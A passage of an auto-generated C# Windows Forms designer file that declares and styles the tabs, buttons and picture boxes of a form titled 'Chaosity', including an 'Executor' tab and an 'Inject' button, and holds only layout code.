            this.flatButton225 = new FlatUI.FlatButton();
            this.tabPage80 = new System.Windows.Forms.TabPage();
            this.flatButton226 = new FlatUI.FlatButton();
            this.pictureBox138 = new System.Windows.Forms.PictureBox();
            this.flatButton227 = new FlatUI.FlatButton();
            this.tabPage81 = new System.Windows.Forms.TabPage();
            this.flatButton228 = new FlatUI.FlatButton();
            this.pictureBox139 = new System.Windows.Forms.PictureBox();
            this.flatButton229 = new FlatUI.FlatButton();
            this.tabPage82 = new System.Windows.Forms.TabPage();
            this.flatButton230 = new FlatUI.FlatButton();
            this.pictureBox140 = new System.Windows.Forms.PictureBox();
            this.flatButton231 = new FlatUI.FlatButton();
            this.tabPage83 = new System.Windows.Forms.TabPage();
            this.flatButton232 = new FlatUI.FlatButton();
            this.pictureBox141 = new System.Windows.Forms.PictureBox();
            this.flatButton233 = new FlatUI.FlatButton();
            this.tabPage86 = new System.Windows.Forms.TabPage();
            this.flatButton244 = new FlatUI.FlatButton();
            this.pictureBox151 = new System.Windows.Forms.PictureBox();
            this.flatButton245 = new FlatUI.FlatButton();
            this.tabPage88 = new System.Windows.Forms.TabPage();
            this.flatButton248 = new FlatUI.FlatButton();
            this.pictureBox153 = new System.Windows.Forms.PictureBox();
            this.flatButton249 = new FlatUI.FlatButton();
            this.tabPage89 = new System.Windows.Forms.TabPage();
            this.flatButton250 = new FlatUI.FlatButton();
            this.pictureBox154 = new System.Windows.Forms.PictureBox();
            this.richTextBox67 = new System.Windows.Forms.RichTextBox();
            this.flatButton251 = new FlatUI.FlatButton();
            this.tabPage90 = new System.Windows.Forms.TabPage();
            this.flatButton252 = new FlatUI.FlatButton();
            this.pictureBox155 = new System.Windows.Forms.PictureBox();
            this.flatButton253 = new FlatUI.FlatButton();
            this.tabPage91 = new System.Windows.Forms.TabPage();
            this.flatButton254 = new FlatUI.FlatButton();
            this.pictureBox156 = new System.Windows.Forms.PictureBox();
            this.flatButton255 = new FlatUI.FlatButton();
            this.tabPage93 = new System.Windows.Forms.TabPage();
            this.flatButton487 = new FlatUI.FlatButton();
            this.flatButton418 = new FlatUI.FlatButton();
            this.flatButton258 = new FlatUI.FlatButton();
            this.pictureBox158 = new System.Windows.Forms.PictureBox();
            this.tabPage94 = new System.Windows.Forms.TabPage();
            this.richTextBox12 = new System.Windows.Forms.RichTextBox();
            this.flatButton427 = new FlatUI.FlatButton();
            this.flatButton31 = new FlatUI.FlatButton();
            this.pictureBox25 = new System.Windows.Forms.PictureBox();
            this.tabPage96 = new System.Windows.Forms.TabPage();
            this.flatButton268 = new FlatUI.FlatButton();
            this.pictureBox167 = new System.Windows.Forms.PictureBox();
            this.richTextBox68 = new System.Windows.Forms.RichTextBox();
            this.flatButton269 = new FlatUI.FlatButton();
            this.tabPage99 = new System.Windows.Forms.TabPage();
            this.flatButton274 = new FlatUI.FlatButton();
            this.pictureBox170 = new System.Windows.Forms.PictureBox();
            this.flatButton275 = new FlatUI.FlatButton();
            this.tabPage103 = new System.Windows.Forms.TabPage();
            this.flatButton292 = new FlatUI.FlatButton();
            this.pictureBox182 = new System.Windows.Forms.PictureBox();
            this.flatButton293 = new FlatUI.FlatButton();
            this.tabPage104 = new System.Windows.Forms.TabPage();
            this.flatButton294 = new FlatUI.FlatButton();
            this.pictureBox183 = new System.Windows.Forms.PictureBox();
            this.richTextBox75 = new System.Windows.Forms.RichTextBox();
            this.flatButton295 = new FlatUI.FlatButton();
            this.tabPage105 = new System.Windows.Forms.TabPage();
            this.flatButton296 = new FlatUI.FlatButton();
            this.pictureBox184 = new System.Windows.Forms.PictureBox();
            this.richTextBox76 = new System.Windows.Forms.RichTextBox();
            this.flatButton297 = new FlatUI.FlatButton();
            this.tabPage107 = new System.Windows.Forms.TabPage();
            this.flatButton300 = new FlatUI.FlatButton();
            this.pictureBox186 = new System.Windows.Forms.PictureBox();
            this.flatButton301 = new FlatUI.FlatButton();
            this.tabPage108 = new System.Windows.Forms.TabPage();
            this.flatButton302 = new FlatUI.FlatButton();
            this.pictureBox187 = new System.Windows.Forms.PictureBox();
            this.flatButton303 = new FlatUI.FlatButton();
            this.tabPage110 = new System.Windows.Forms.TabPage();
            this.flatButton314 = new FlatUI.FlatButton();
            this.pictureBox196 = new System.Windows.Forms.PictureBox();
            this.flatButton315 = new FlatUI.FlatButton();
            this.tabPage111 = new System.Windows.Forms.TabPage();
            this.flatButton316 = new FlatUI.FlatButton();
            this.pictureBox197 = new System.Windows.Forms.PictureBox();
            this.flatButton317 = new FlatUI.FlatButton();
            this.tabPage112 = new System.Windows.Forms.TabPage();
            this.flatButton318 = new FlatUI.FlatButton();
            this.pictureBox198 = new System.Windows.Forms.PictureBox();
            this.flatButton319 = new FlatUI.FlatButton();
            this.tabPage113 = new System.Windows.Forms.TabPage();
            this.richTextBox6 = new System.Windows.Forms.RichTextBox();
            this.flatButton320 = new FlatUI.FlatButton();
            this.pictureBox199 = new System.Windows.Forms.PictureBox();
            this.flatButton321 = new FlatUI.FlatButton();
            this.tabPage117 = new System.Windows.Forms.TabPage();
            this.richTextBox105 = new System.Windows.Forms.RichTextBox();
            this.flatButton446 = new FlatUI.FlatButton();
            this.flatButton334 = new FlatUI.FlatButton();
            this.pictureBox210 = new System.Windows.Forms.PictureBox();
            this.tabPage119 = new System.Windows.Forms.TabPage();
            this.flatButton338 = new FlatUI.FlatButton();
            this.pictureBox212 = new System.Windows.Forms.PictureBox();
            this.flatButton339 = new FlatUI.FlatButton();
            this.tabPage120 = new System.Windows.Forms.TabPage();
            this.flatButton417 = new FlatUI.FlatButton();
            this.flatButton340 = new FlatUI.FlatButton();
            this.pictureBox213 = new System.Windows.Forms.PictureBox();
            this.flatButton341 = new FlatUI.FlatButton();
            this.tabPage122 = new System.Windows.Forms.TabPage();
            this.flatButton344 = new FlatUI.FlatButton();
            this.pictureBox215 = new System.Windows.Forms.PictureBox();
            this.richTextBox84 = new System.Windows.Forms.RichTextBox();
            this.flatButton345 = new FlatUI.FlatButton();
            this.tabPage124 = new System.Windows.Forms.TabPage();
            this.flatButton348 = new FlatUI.FlatButton();
            this.pictureBox217 = new System.Windows.Forms.PictureBox();
            this.richTextBox86 = new System.Windows.Forms.RichTextBox();
            this.flatButton349 = new FlatUI.FlatButton();
            this.tabPage125 = new System.Windows.Forms.TabPage();
            this.flatButton350 = new FlatUI.FlatButton();
            this.pictureBox218 = new System.Windows.Forms.PictureBox();
            this.richTextBox87 = new System.Windows.Forms.RichTextBox();
            this.flatButton351 = new FlatUI.FlatButton();
            this.tabPage126 = new System.Windows.Forms.TabPage();
            this.flatButton358 = new FlatUI.FlatButton();
            this.pictureBox226 = new System.Windows.Forms.PictureBox();
            this.flatButton359 = new FlatUI.FlatButton();
            this.tabPage127 = new System.Windows.Forms.TabPage();
            this.flatButton360 = new FlatUI.FlatButton();
            this.pictureBox227 = new System.Windows.Forms.PictureBox();
            this.flatButton361 = new FlatUI.FlatButton();
            this.tabPage128 = new System.Windows.Forms.TabPage();
            this.flatButton362 = new FlatUI.FlatButton();
            this.pictureBox228 = new System.Windows.Forms.PictureBox();
            this.flatButton363 = new FlatUI.FlatButton();
            this.tabPage129 = new System.Windows.Forms.TabPage();
            this.flatButton364 = new FlatUI.FlatButton();
            this.pictureBox229 = new System.Windows.Forms.PictureBox();
            this.flatButton365 = new FlatUI.FlatButton();
            this.tabPage130 = new System.Windows.Forms.TabPage();
            this.richTextBox101 = new System.Windows.Forms.RichTextBox();
            this.flatButton366 = new FlatUI.FlatButton();
            this.pictureBox230 = new System.Windows.Forms.PictureBox();
            this.flatButton367 = new FlatUI.FlatButton();
            this.tabPage132 = new System.Windows.Forms.TabPage();
            this.flatButton370 = new FlatUI.FlatButton();
            this.pictureBox232 = new System.Windows.Forms.PictureBox();
            this.richTextBox88 = new System.Windows.Forms.RichTextBox();
            this.flatButton371 = new FlatUI.FlatButton();
            this.tabPage136 = new System.Windows.Forms.TabPage();
            this.flatButton385 = new FlatUI.FlatButton();
            this.pictureBox243 = new System.Windows.Forms.PictureBox();
            this.richTextBox91 = new System.Windows.Forms.RichTextBox();
            this.flatButton386 = new FlatUI.FlatButton();
            this.tabPage137 = new System.Windows.Forms.TabPage();
            this.flatButton387 = new FlatUI.FlatButton();
            this.pictureBox244 = new System.Windows.Forms.PictureBox();
            this.flatButton388 = new FlatUI.FlatButton();
            this.tabPage140 = new System.Windows.Forms.TabPage();
            this.flatButton393 = new FlatUI.FlatButton();
            this.pictureBox247 = new System.Windows.Forms.PictureBox();
            this.richTextBox94 = new System.Windows.Forms.RichTextBox();
            this.flatButton394 = new FlatUI.FlatButton();
            this.tabPage141 = new System.Windows.Forms.TabPage();
            this.flatButton395 = new FlatUI.FlatButton();
            this.pictureBox248 = new System.Windows.Forms.PictureBox();
            this.flatButton396 = new FlatUI.FlatButton();
            this.tabPage142 = new System.Windows.Forms.TabPage();
            this.flatButton397 = new FlatUI.FlatButton();
            this.pictureBox249 = new System.Windows.Forms.PictureBox();
            this.flatButton398 = new FlatUI.FlatButton();
            this.tabPage143 = new System.Windows.Forms.TabPage();
            this.flatButton405 = new FlatUI.FlatButton();
            this.pictureBox257 = new System.Windows.Forms.PictureBox();
            this.flatButton406 = new FlatUI.FlatButton();
            this.tabPage144 = new System.Windows.Forms.TabPage();
            this.flatButton407 = new FlatUI.FlatButton();
            this.pictureBox258 = new System.Windows.Forms.PictureBox();
            this.flatButton408 = new FlatUI.FlatButton();
            this.tabPage145 = new System.Windows.Forms.TabPage();
            this.flatButton409 = new FlatUI.FlatButton();
            this.pictureBox259 = new System.Windows.Forms.PictureBox();
            this.flatButton410 = new FlatUI.FlatButton();
            this.tabPage146 = new System.Windows.Forms.TabPage();
            this.flatButton411 = new FlatUI.FlatButton();
            this.pictureBox260 = new System.Windows.Forms.PictureBox();
            this.flatButton412 = new FlatUI.FlatButton();
            this.tabPage147 = new System.Windows.Forms.TabPage();
            this.flatButton413 = new FlatUI.FlatButton();
            this.pictureBox261 = new System.Windows.Forms.PictureBox();
            this.flatButton414 = new FlatUI.FlatButton();
            this.tabPage148 = new System.Windows.Forms.TabPage();
            this.flatButton415 = new FlatUI.FlatButton();
            this.pictureBox262 = new System.Windows.Forms.PictureBox();
            this.flatButton416 = new FlatUI.FlatButton();
            this.tabPage149 = new System.Windows.Forms.TabPage();
            this.flatButton419 = new FlatUI.FlatButton();
            this.flatButton420 = new FlatUI.FlatButton();
            this.pictureBox263 = new System.Windows.Forms.PictureBox();
            this.tabPage150 = new System.Windows.Forms.TabPage();
            this.flatButton428 = new FlatUI.FlatButton();
            this.pictureBox271 = new System.Windows.Forms.PictureBox();
            this.richTextBox96 = new System.Windows.Forms.RichTextBox();
            this.flatButton429 = new FlatUI.FlatButton();
            this.tabPage151 = new System.Windows.Forms.TabPage();
            this.flatButton430 = new FlatUI.FlatButton();
            this.pictureBox272 = new System.Windows.Forms.PictureBox();
            this.richTextBox97 = new System.Windows.Forms.RichTextBox();
            this.flatButton431 = new FlatUI.FlatButton();
            this.tabPage152 = new System.Windows.Forms.TabPage();
            this.flatButton432 = new FlatUI.FlatButton();
            this.pictureBox273 = new System.Windows.Forms.PictureBox();
            this.flatButton433 = new FlatUI.FlatButton();
            this.tabPage153 = new System.Windows.Forms.TabPage();
            this.flatButton434 = new FlatUI.FlatButton();
            this.pictureBox274 = new System.Windows.Forms.PictureBox();
            this.richTextBox98 = new System.Windows.Forms.RichTextBox();
            this.flatButton435 = new FlatUI.FlatButton();
            this.tabPage154 = new System.Windows.Forms.TabPage();
            this.flatButton436 = new FlatUI.FlatButton();
            this.pictureBox275 = new System.Windows.Forms.PictureBox();
            this.richTextBox99 = new System.Windows.Forms.RichTextBox();
            this.flatButton437 = new FlatUI.FlatButton();
            this.tabPage155 = new System.Windows.Forms.TabPage();
            this.flatButton438 = new FlatUI.FlatButton();
            this.pictureBox276 = new System.Windows.Forms.PictureBox();
            this.richTextBox100 = new System.Windows.Forms.RichTextBox();
            this.flatButton439 = new FlatUI.FlatButton();
            this.tabPage156 = new System.Windows.Forms.TabPage();
            this.richTextBox103 = new System.Windows.Forms.RichTextBox();
            this.flatButton442 = new FlatUI.FlatButton();
            this.flatButton440 = new FlatUI.FlatButton();
            this.pictureBox277 = new System.Windows.Forms.PictureBox();
            this.richTextBox102 = new System.Windows.Forms.RichTextBox();
            this.flatButton441 = new FlatUI.FlatButton();
            this.tabPage158 = new System.Windows.Forms.TabPage();
            this.flatButton56 = new FlatUI.FlatButton();
            this.pictureBox33 = new System.Windows.Forms.PictureBox();
            this.flatButton76 = new FlatUI.FlatButton();
            this.tabPage159 = new System.Windows.Forms.TabPage();
            this.flatButton455 = new FlatUI.FlatButton();
            this.pictureBox287 = new System.Windows.Forms.PictureBox();
            this.flatButton456 = new FlatUI.FlatButton();
            this.tabPage160 = new System.Windows.Forms.TabPage();
            this.flatButton457 = new FlatUI.FlatButton();
            this.pictureBox288 = new System.Windows.Forms.PictureBox();
            this.flatButton458 = new FlatUI.FlatButton();
            this.tabPage161 = new System.Windows.Forms.TabPage();
            this.flatButton459 = new FlatUI.FlatButton();
            this.pictureBox289 = new System.Windows.Forms.PictureBox();
            this.flatButton460 = new FlatUI.FlatButton();
            this.tabPage162 = new System.Windows.Forms.TabPage();
            this.flatButton461 = new FlatUI.FlatButton();
            this.pictureBox290 = new System.Windows.Forms.PictureBox();
            this.flatButton462 = new FlatUI.FlatButton();
            this.tabPage163 = new System.Windows.Forms.TabPage();
            this.flatButton463 = new FlatUI.FlatButton();
            this.pictureBox291 = new System.Windows.Forms.PictureBox();
            this.richTextBox106 = new System.Windows.Forms.RichTextBox();
            this.flatButton464 = new FlatUI.FlatButton();
            this.tabPage164 = new System.Windows.Forms.TabPage();
            this.flatButton471 = new FlatUI.FlatButton();
            this.pictureBox299 = new System.Windows.Forms.PictureBox();
            this.flatButton472 = new FlatUI.FlatButton();
            this.tabPage165 = new System.Windows.Forms.TabPage();
            this.flatButton473 = new FlatUI.FlatButton();
            this.pictureBox300 = new System.Windows.Forms.PictureBox();
            this.flatButton474 = new FlatUI.FlatButton();
            this.tabPage166 = new System.Windows.Forms.TabPage();
            this.flatButton475 = new FlatUI.FlatButton();
            this.pictureBox301 = new System.Windows.Forms.PictureBox();
            this.flatButton476 = new FlatUI.FlatButton();
            this.tabPage167 = new System.Windows.Forms.TabPage();
            this.flatButton477 = new FlatUI.FlatButton();
            this.pictureBox302 = new System.Windows.Forms.PictureBox();
            this.flatButton478 = new FlatUI.FlatButton();
            this.tabPage168 = new System.Windows.Forms.TabPage();
            this.flatButton479 = new FlatUI.FlatButton();
            this.pictureBox303 = new System.Windows.Forms.PictureBox();
            this.flatButton480 = new FlatUI.FlatButton();
            this.tabPage170 = new System.Windows.Forms.TabPage();
            this.flatButton483 = new FlatUI.FlatButton();
            this.pictureBox305 = new System.Windows.Forms.PictureBox();
            this.flatButton484 = new FlatUI.FlatButton();
            this.From1.SuspendLayout();
            this.flatTabControl2.SuspendLayout();
            this.Executor.SuspendLayout();
            this.Main.SuspendLayout();
            this.tabPage27.SuspendLayout();
            this.tabPage30.SuspendLayout();
            this.tabPage31.SuspendLayout();
            this.tabPage32.SuspendLayout();
            this.tabPage33.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox46)).BeginInit();
            this.tabPage36.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox58)).BeginInit();
            this.tabPage38.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox60)).BeginInit();
            this.tabPage45.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox70)).BeginInit();
            this.tabPage48.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox78)).BeginInit();
            this.tabPage51.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).BeginInit();
            this.tabPage52.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox88)).BeginInit();
            this.tabPage58.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox94)).BeginInit();
            this.tabPage61.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox19)).BeginInit();
            this.tabPage64.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox106)).BeginInit();
            this.tabPage65.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox107)).BeginInit();
            this.tabPage66.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox108)).BeginInit();
            this.tabPage67.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox109)).BeginInit();
            this.tabPage70.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox119)).BeginInit();
            this.tabPage72.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox121)).BeginInit();
            this.tabPage74.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox123)).BeginInit();
            this.tabPage76.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox134)).BeginInit();
            this.tabPage77.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox135)).BeginInit();
            this.tabPage79.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox137)).BeginInit();
            this.tabPage80.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox138)).BeginInit();
            this.tabPage81.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox139)).BeginInit();
            this.tabPage82.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox140)).BeginInit();
            this.tabPage83.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox141)).BeginInit();
            this.tabPage86.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox151)).BeginInit();
            this.tabPage88.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox153)).BeginInit();
            this.tabPage89.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox154)).BeginInit();
            this.tabPage90.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox155)).BeginInit();
            this.tabPage91.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox156)).BeginInit();
            this.tabPage93.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox158)).BeginInit();
            this.tabPage94.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox25)).BeginInit();
            this.tabPage96.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox167)).BeginInit();
            this.tabPage99.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox170)).BeginInit();
            this.tabPage103.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox182)).BeginInit();
            this.tabPage104.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox183)).BeginInit();
            this.tabPage105.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox184)).BeginInit();
            this.tabPage107.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox186)).BeginInit();
            this.tabPage108.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox187)).BeginInit();
            this.tabPage110.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox196)).BeginInit();
            this.tabPage111.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox197)).BeginInit();
            this.tabPage112.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox198)).BeginInit();
            this.tabPage113.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox199)).BeginInit();
            this.tabPage117.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox210)).BeginInit();
            this.tabPage119.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox212)).BeginInit();
            this.tabPage120.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox213)).BeginInit();
            this.tabPage122.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox215)).BeginInit();
            this.tabPage124.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox217)).BeginInit();
            this.tabPage125.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox218)).BeginInit();
            this.tabPage126.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox226)).BeginInit();
            this.tabPage127.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox227)).BeginInit();
            this.tabPage128.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox228)).BeginInit();
            this.tabPage129.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox229)).BeginInit();
            this.tabPage130.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox230)).BeginInit();
            this.tabPage132.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox232)).BeginInit();
            this.tabPage136.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox243)).BeginInit();
            this.tabPage137.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox244)).BeginInit();
            this.tabPage140.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox247)).BeginInit();
            this.tabPage141.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox248)).BeginInit();
            this.tabPage142.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox249)).BeginInit();
            this.tabPage143.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox257)).BeginInit();
            this.tabPage144.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox258)).BeginInit();
            this.tabPage145.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox259)).BeginInit();
            this.tabPage146.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox260)).BeginInit();
            this.tabPage147.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox261)).BeginInit();
            this.tabPage148.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox262)).BeginInit();
            this.tabPage149.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox263)).BeginInit();
            this.tabPage150.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox271)).BeginInit();
            this.tabPage151.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox272)).BeginInit();
            this.tabPage152.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox273)).BeginInit();
            this.tabPage153.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox274)).BeginInit();
            this.tabPage154.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox275)).BeginInit();
            this.tabPage155.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox276)).BeginInit();
            this.tabPage156.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox277)).BeginInit();
            this.tabPage158.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox33)).BeginInit();
            this.tabPage159.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox287)).BeginInit();
            this.tabPage160.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox288)).BeginInit();
            this.tabPage161.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox289)).BeginInit();
            this.tabPage162.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox290)).BeginInit();
            this.tabPage163.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox291)).BeginInit();
            this.tabPage164.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox299)).BeginInit();
            this.tabPage165.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox300)).BeginInit();
            this.tabPage166.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox301)).BeginInit();
            this.tabPage167.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox302)).BeginInit();
            this.tabPage168.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox303)).BeginInit();
            this.tabPage170.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox305)).BeginInit();
            this.SuspendLayout();
            // 
            // From1
            // 
            this.From1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.From1.BaseColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.From1.BorderColor = System.Drawing.Color.LightSkyBlue;
            this.From1.Controls.Add(this.button4);
            this.From1.Controls.Add(this.button6);
            this.From1.Controls.Add(this.button40);
            this.From1.Controls.Add(this.flatTabControl2);
            this.From1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.From1.FlatColor = System.Drawing.Color.Red;
            this.From1.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.From1.ForeColor = System.Drawing.Color.Coral;
            this.From1.HeaderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.From1.HeaderMaximize = false;
            this.From1.Location = new System.Drawing.Point(0, 0);
            this.From1.Name = "From1";
            this.From1.Size = new System.Drawing.Size(523, 344);
            this.From1.TabIndex = 0;
            this.From1.Text = "Chaosity";
            this.From1.Click += new System.EventHandler(this.From1_Click);
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.button4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button4.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Bahnschrift", 8F);
            this.button4.ForeColor = System.Drawing.Color.White;
            this.button4.Location = new System.Drawing.Point(470, 3);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(20, 20);
            this.button4.TabIndex = 45;
            this.button4.Text = "-";
            this.button4.UseVisualStyleBackColor = false;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // button6
            // 
            this.button6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.button6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button6.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button6.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button6.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button6.Font = new System.Drawing.Font("Bahnschrift", 8F);
            this.button6.ForeColor = System.Drawing.Color.White;
            this.button6.Location = new System.Drawing.Point(496, 3);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(20, 20);
            this.button6.TabIndex = 44;
            this.button6.Text = "X";
            this.button6.UseVisualStyleBackColor = false;
            this.button6.Click += new System.EventHandler(this.button6_Click);
            // 
            // button40
            // 
            this.button40.BackColor = System.Drawing.Color.Transparent;
            this.button40.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button40.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button40.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
            this.button40.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
            this.button40.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button40.Font = new System.Drawing.Font("Bahnschrift", 8F);
            this.button40.ForeColor = System.Drawing.Color.White;
            this.button40.Location = new System.Drawing.Point(409, 2);
            this.button40.Name = "button40";
            this.button40.Size = new System.Drawing.Size(55, 23);
            this.button40.TabIndex = 16;
            this.button40.Text = "Inject";
            this.button40.UseVisualStyleBackColor = false;
            this.button40.Click += new System.EventHandler(this.button40_Click);
            // 
            // flatTabControl2
            // 
            this.flatTabControl2.ActiveColor = System.Drawing.Color.Red;
            this.flatTabControl2.BaseColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(49)))));
            this.flatTabControl2.Controls.Add(this.Executor);
            this.flatTabControl2.Controls.Add(this.Main);
            this.flatTabControl2.Controls.Add(this.tabPage27);
            this.flatTabControl2.Controls.Add(this.tabPage30);
            this.flatTabControl2.Controls.Add(this.tabPage31);
            this.flatTabControl2.Controls.Add(this.tabPage32);
            this.flatTabControl2.Controls.Add(this.tabPage33);
            this.flatTabControl2.Controls.Add(this.tabPage36);
            this.flatTabControl2.Controls.Add(this.tabPage38);
            this.flatTabControl2.Controls.Add(this.tabPage45);
            this.flatTabControl2.Controls.Add(this.tabPage48);
